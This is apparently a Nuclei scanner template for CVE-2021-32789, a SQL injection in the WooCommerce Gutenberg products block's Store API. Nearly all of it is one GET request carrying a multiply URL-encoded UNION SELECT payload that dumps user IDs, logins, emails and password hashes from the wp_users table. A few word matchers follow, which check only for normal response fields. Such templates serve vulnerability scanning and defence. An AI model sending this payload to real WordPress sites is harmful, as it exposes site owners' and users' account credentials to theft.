id: CVE-2021-32789

info:
  name: woocommerce-gutenberg-products-block - Arbitrary SQL (SQL injection) possible via the Store API component.
  author: dhiyaneshDK
  severity: medium
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-32789
  tags: wordpress,cve2021
requests:
  - method: GET
    path:
      - '{{BaseURL}}/wp-json/wc/store/products/collection-data?calculate_attribute_counts[][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252Cuser_login%25252C0x3a%25252Cuser_email%25252C0x3a%25252Cuser_pass%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'price_range'
          - 'attribute_counts'
          - 'rating_counts'
        condition: and
